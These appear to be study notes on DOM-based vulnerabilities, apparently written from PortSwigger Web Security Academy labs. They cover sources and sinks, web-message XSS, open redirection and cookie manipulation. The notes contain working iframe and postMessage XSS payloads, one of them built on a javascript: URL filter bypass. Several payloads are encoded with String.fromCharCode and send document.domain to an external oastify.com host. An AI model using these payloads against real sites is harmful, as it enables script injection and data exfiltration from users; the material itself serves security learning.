![[DOM-Based.png]]
# Document Object Model (DOM)

DOM is a browser's hierarchical representation of the elements on the page. Sites can use JavaScript to manipulate nodes and objects of the DOM and their properties. DOM-based vulnerabilities happen when a site contains JavaScript that takes an attacker-controllable value (source) and passes it into a dangerous function (sink).

A `source` is a property that accepts data that is attacker controlled such as `location.search` property which reads input from the query string which can be manipulated and controlled. Any property controlled by an attacker is a potential source.

It includes the referring URL (`document.referrer`), the user cookies (`document.cookie`) and web messages.

A sink is a dangerous JavaScript function that can be bad if attacker data is passed to it such as the `eval()` function which processes the argument passed to it as JavaScript. An example HTML sink is `document.body.innerHTML` which allows attackers to inject HTML and execute JavaScript.

Most common source is the URL, typically accessed with the `location` object. An attacker constructs links to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL such as:

```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

The `location.hash` source may be handled in an unsafe way. If the URL contains a hash fragment starting with `https:`, it will extract the value of the property and set it as the location property of the window such as:

```html
https://www.innocent-website.com/example#https://www.evil-user.net
```

Some typical sources for exploitation are:

- `document.URL`
- `document.documentURI`
- `document.URLEncoded`
- `document.baseURI`
- `location`
- `document.cookie`
- `document.referrer`
- `window.name`
- `history.pushState`
- `history.replaceState`
- `localStorage`
- `sessionStorage`
- `IndexedDB` (`mozIndexedDB`, `webkitIndexedDB`, `msIndexedDB`)
- `Database`

Some sinks which can be dangerous include:

| DOM-Vulnerability                | Example Sink             |
| -------------------------------- | ------------------------ |
| DOM XSS                          | document.write()         |
| Open Redirection                 | window.location          |
| Cookie manipulation              | document.cookie          |
| JavaScript injection             | eval()                   |
| Document-domain manipulation     | document.domain          |
| WebSocket-URL poisoning          | WebSocket()              |
| Link manipulation                | element.src              |
| Web message manipulation         | postMessage()            |
| AJAX request-header manipulation | setRequestHeader()       |
| Local file-path manipulation     | FileReader.readAsText()  |
| Client-side SQL injection        | ExecuteSql()             |
| HTML5-storage manipulation       | sessionStorage.setItem() |
| Client-Side XPath injection      | document.evaluate()      |
| Client-side JSON injection       | JSON.parse()             |
| DOM data manipulation            | element.setAttribute()   |
| Denial of service (DoS)          | RegExp()                 |
# Recon

Use the DevTools and go to the Sources/Debugger tab. In every page, you can search for the keyword "script" and also search through all JavaScript pages.

In these files/pages, you can search for any user-controllable sources and dangerous sinks that the JavaScript is using. Analyse if JavaScript is taking any sources and including them into dangerous sinks. Search all static JavaScript files too.

>[!info]
>[DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) plugin can also help.
# DOM XSS via Web Messages

A web message is a way of two windows communicating using a JavaScript method called `window.postMessage()`. It sends messages between windows. For example, the `window` object represents the current window.

It's possible to add an event listener called `message` and add a callback function to be called when the window receives a web message such as:

```javascript
window.addEventListener('message', (e) => {
	console.log(e.data);
});
```

It will print out the value of the web message. It attaches an event listener. When a web message is received, it will console.log the value of the message. To execute it, use:

```javascript
window.postMessage('Hello');
```

This would execute the console.log and print it to the console.

If a page handles incoming web messages unsafely, properties and functions called by an event listener can become sinks. An attacker can host a malicious `iframe` and use `postMessage()` method to pass web message data to the vulnerable event listener and send the payload to a sink on the parent page.

For example:

```javascript
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

An attacker can inject a JavaScript payload such as:

```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

If the event listener does not verify the origin, and the `postMessagE()` specifies the `targetOrigin` `"*"`, it accepts it and passes it into a sink such as `eval()`.

As an example, a page may contain an `addEventListener` call that listens for web messages, defines a callback function which takes an argument (the event) and executes JavaScript that manipulates the DOM:

```js
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
```

If so, look for an element with ID of `ads`. It sets the inner HTML of the element to the value of the web message `e.data`. For example, try making a call to `postMessage` with a message and it may be reflected on the page. 

There may be a sink since user supplied data is passed into a callback function with the innerHTML of the ID `ads` is being set to the value of the web message - an attacker has control over the web message. To exploit it, try injecting HTML such as:

```html
window.postMessage("<img src=x onerror=alert(1)>")
```

If the origin is not validated, an attacker can load a vulnerable page inside an iframe. When the victim lands on our domain, an attacker controls the iframe domain. For example:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

The iframe loads the vulnerable page and once loaded, it executes the JavaScript:

- `this` - refers to the iframe
- `contentWindow` - refers to the window object
- `postMessage` -  send a web message with the XSS payload
- `'*'` - the target origin (specifies what origin of the destination window must be for the event to be dispatched), it does not care about the origin of the recipient.

If the target origin does not match up with the real origin, it is never dispatched.

For exploitation payloads, you can use document.location to exfiltrate data and encode the payload to bypass filters. The below payload can be used to test in the DevTools console. The "String.fromCharCode" contains the following:

- `document.location = "https://m651thgj.oastify.com/?x=" + document.domain + "END"`

```html
postMessage('<img src=x onerror=alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,58,47,47,118,99,98,100,122,101,57,111,108,115,102,53,112,110,119,113,49,103,98,104,107,115,101,56,103,122,109,113,97,103,121,53,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)))>')
```

The final payload for the exploit server:

```html
<iframe src="https://0a41005003b5365e82996bf000200091.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,58,47,47,118,99,98,100,122,101,57,111,108,115,102,53,112,110,119,113,49,103,98,104,107,115,101,56,103,122,109,113,97,103,121,53,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,69,78,68,34)))>','*')">
```
# DOM XSS via Web Messages and JavaScript URL

As another example of web messages, a page may contain an event listener call that listens for a web message such as:

```javascript
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

It has a callback function that receives the event as an argument and assigning the `url` variable to the value of `e.data` (value of web message). A check is ran to make sure that `url.indexOf` of HTTP or HTTPS is greater than `-1`.  If true, `location.href` is set to the value of URL.

A web message which contains URL in string format, a certain check is run on the URL. If successful, the users browser is redirected to the URL contained in the web message as a string. The check for `-1` would be returned from `indexOf` if there was no match of the substring within the string. 

The check determines if the substring `http` or `https` is found within the web message URL or string at any point. If it does, it thinks it is a valid URL and sets `location.href` to that value. Inside `location.href`, JavaScript can be executed via the `javascript:` string:

```javascript
location.href = "javascript:print()"
```

For exploitation, since it only checks that `http:` or `https:` is present and not at the start, comment characters could be used:

```javascript
location.href = "javascript:print()//https:"
```

The https string is commented out, but the check is still passed as it is present in the user input somewhere. A malicious iframe can be crafted:

```javascript
<iframe src="https://0a3400f9036f307c8107da9c00730037.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

The iframe loads the vulnerable page and once loaded, it executes the JavaScript:

- `this` - refers to the iframe
- `contentWindow` - refers to the window object
- `postMessage` -  send a web message with the XSS payload to bypass the verification
- `'*'` - the target origin (specifies what origin of the destination window must be for the event to be dispatched), it does not care about the origin of the recipient.

>[!info]
>The second argument specifies that any targetOrigin is allowed for the web message.

For exploitation payloads, you can use document.location to exfiltrate data and encode the payload to bypass filters. The below payload can be used to test in the DevTools console. The pseudo javascript protocol is used here as the data is inserted in href.

```javascript
postMessage('javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,102,52,107,51,49,118,108,99,57,103,120,53,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))//http:')
```

The final payload:

```html
<iframe src="https://0ac6000c045b941d800f44e400e9009d.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,98,114,54,122,119,122,110,110,99,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))//http:','*')">
```

# DOM XSS via Web Messages and JSON.parse

If an event listener includes origin verification, the step can sometimes be flawed. For example:

```js
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
```

The `indexOf` method tries to verify the origin of the incoming message is from a specific domain, but it only checks whether the string `normal-website.com` is contained anywhere in the origin URL. It can be bypassed if the origin of the malicious message was `http://www.normal-website.com.evil.net`.

It also applies to verification checks that rely on the `startsWith()` or `endsWith()` methods. An example event listener could regard the origin `http://maliicous-websitenormal-website.com` as safe:

```javascript
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
```

For example, an event listener may be as follows:

```js
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
```

It starts an event listener which listens for a web message. Once received it executes a callback function which takes the web message as the argument.

An iframe is being created for the variable `iframe`. A second variable `ACMEplayer` is declared which is assigned to the value of an object which has 1 key element with a property of `iframe`.

The `d` is a third variable being declared, but not initialized with a value.

The body of the DOM is accessed and uses `appendChild` method which is passed the `iframe` - it attaches a new created iframe to the page. 

>[!info]
>A try block typically contains JavaScript that could result in an error. If an error happens, the JS can continue without issue.

The try block assigns a value to the `d` variable of `JSON.parse(e.data)` which takes in a JavaScript object as a string and converts it to a JavaScript object. It grabs the JSON in string format from the value `e.data` which is the value of the web message. The web message should be JSON in string format.

The `d` variable is assigned a JavaScript object which is based on JSON that was part of the web message.

>[!info]
>A switch block looks at the value passed in the parentheses and depending on the value of `d.type`, a specific block is executed.

If the value is `page-load`, it would execute `ACMEplayer.element.scrollIntoView()`. There are 3 values for it:

- page-load
- load-channel
- player-height-changed

The `load-channel` block is the most interesting as it sets the source of the iframe. `ACMEplayer.element` is the same as `iframe` and `.src` means it sets the value of `iframe.src` to the value of `d.url`. 

The `d` value is an object with many potential keys.

>[!danger]
>Anytime you can specify a URL as part of a piece of code, there is a chance to execute JavaScript directly making use of `javascript:` - inlined JavaScript.

The vulnerable event listener is waiting for a JavaScript object in JSON stringified format. The object must have two key:

- `type` - set to load-channel
- `url` - will be assigned to the source of the iframe

As an example, a dummy event listener and some JSON could be written such as:

```javascript
window.addEventListener('message', (e) => {
	console.log(e.data);
})
```

```json
let payload = '{"type": "load-channel", "url": "javascript:prompt()"}'
```

The string contains JSON data. After the string is parsed to the JSON.parse method, it becomes a valid JavaScript object. Attempting to post it to the page may result in a prompt box appearing. An exploit may be:

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

The iframe loads the vulnerable page and once loaded, it executes the JavaScript:

- `this` - refers to the iframe
- `contentWindow` - refers to the window object
- `postMessage` -  send a web message with the XSS payload to load a malicious `iframe.src` value
- `'*'` - the target origin (specifies what origin of the destination window must be for the event to be dispatched), it does not care about the origin of the recipient.

The double quotes must be escaped to indicate they are part of the string and not to terminate the first double quote used.

The exploitation payload:

```html
<iframe src=https://0ab400b604252be5803512fc002b00ad.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,112,99,53,100,118,116,109,104,100,97,49,122,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34)))\"}","*")'>
```
# DOM-Based Open Redirection

Open redirections arise when scripts write attacker-controllable data into a sink that can trigger cross-domain navigation. The code may be vulnerable due to unsafe handling of `location.hash` properties:

```js
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```

Open redirect can be used for phishing attacks since many users don't notice the subsequent redirection to a different domain. IF attackers controls the start of the string passed to the redirection API, it may be possible to escalate into an injection attack via the `javascript:` pseudo protocol to execute code when URL is processed.

Some sinks to look for include:

- location
- location.host
- location.hostname
- location.href
- location.pathname
- location.search
- location.protocol
- location.assign()
- location.replace()
- open()
- element.srcdoc
- XMLHttpRequest.open()
- XMLHttpRequest.send()
- jQuery.ajax()
- $.ajax()

An example, there may be a link at the bottom of a page to go back home such as:

```html
<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>
```

It may return an onclick attribute that contains inline JavaScript. The `returnURL` variable is being assigned a value. The `/` indicates the start and end of a regular expression. The regular expressions calls `exec` which takes an argument of `location` - anything in the URL bar.

The URL is measured against the regex to check for a match. The value of `location.href` is assigned depending on if there is a match or not via a ternary operator `?`. If `returnURL` exists (depends on a match), it sets the value of `location.href` to `returnUrl[1]`. If no match, it sets the location to `/`.

It looks in the URL specifically for `url=` and then either `http://` or `https://` due to the question mark. The `.` represents any character and the `+` represents an unlimited number of characters.

It looks for `url=[URL]`. If there is a URL, there is a match and `location.href` is set to the value of the URL instead of `/`.

Try submitting the required parameters such as and clicking the button to trigger the `onclick` event:

```bash
&url=https://google.com
```

To test further, running the code in the console returns two results:

```javascript
location;
/url=(https?:\/\/.+)/.exec(location);
```

The left and right parentheses set up a capture group that references a specific part of the regex later. The first match may be the first item in the array (the URL parameter match) and the second item (value of the capture group being returned):

```json
[
    "url=https://google.com",
    "https://google.com"
]
```

The JavaScript needs to reference the URL directly which the parentheses do (defining the capture group). The second item of the array it grabs is the value of the capture group (full URL). Removing parentheses returns a single result:

```json
[
    "url=https://google.com#"
]
```
# DOM-Based Cookie Manipulation

Some vulnerabilities allow attackers to manipulate data that don't control. Cookie manipulation occurs when a script writes attacker controlled data into the value of a cookie. An attacker can use it to construct a URL that can set a value in the user's cookie. 

Many sinks are harmless, but DOM based cookie attacks can exploit them. If JavaScript writes data from a source into `document.cookie` without sanitization, an attacker can manipulate the value of a cookie to inject values:

```js
document.cookie = 'cookieName='+location.hash.slice(1);
```

If the site unsafely reflects values from cookies without HTML encoding them, it can be exploited.

For example, there may be a product ID in the URL and an option to view the "last viewed product" on the home page which may be stored in a cookie:

```html
lastViewedProduct=https://0aa7008203d0dae081e566ca00ec00f5.web-security-academy.net/product?productId=1
```

It could be set via some code:

```js
 document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
```

It sets a cookie with the value being set to `window.location` which is the URL as the product ID. It assigns the value dynamically depending on the value of the URL bar. By setting another parameter in the URL, the cookie value can be controlled by us.

The cookie may be used to populate a link to the previous product, including any parameters the attacker sets:

```html
<a href="https://0aa7008203d0dae081e566ca00ec00f5.web-security-academy.net/product?productId=1">Last viewed product</a>
```

Attackers can inject into the href attribute of an anchor tag. If so, try exiting the anchor tag by submitting a single quote, closing angle bracket and then supplying a simple XSS alert:

```html
https://0aa7008203d0dae081e566ca00ec00f5.web-security-academy.net/product?productId=1&'><script>print()</script>
```

The function may execute:

```html
<a href='https://0aa7008203d0dae081e566ca00ec00f5.web-security-academy.net/product?productId=1&'><script>print()</script>'>Last viewed product</a>
```

It closes the href attribute, closes the anchor tag and then executes the script tags. To exploit it, an iframe could be used:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

An iframe is loaded with the source being the vulnerable URL with script tags. The value of the cookie is set with the value of the URL. The victim must navigate back to the home page to get executed. The `onload` attribute has a conditional that says if the window is not set, then`this.src` is set to the value of the home page. 

The iframe source would be changed to the home page. The `window.x` is set to 1 to prevent an infinite loop.

And the exploitation payload:

```html
<iframe src="https://0ac0003e03b1155582af4721003c00da.web-security-academy.net/product?productId=1&'><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,32,61,32,34,104,116,116,112,115,58,47,47,100,101,118,49,98,116,104,49,100,112,50,46,111,97,115,116,105,102,121,46,99,111,109,47,63,120,61,34,32,43,32,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,32,43,32,34,85,83,69,82,69,78,68,34))</script>" onload="if(!window.x)this.src='https://0ac0003e03b1155582af4721003c00da.web-security-academy.net';window.x=1;">
```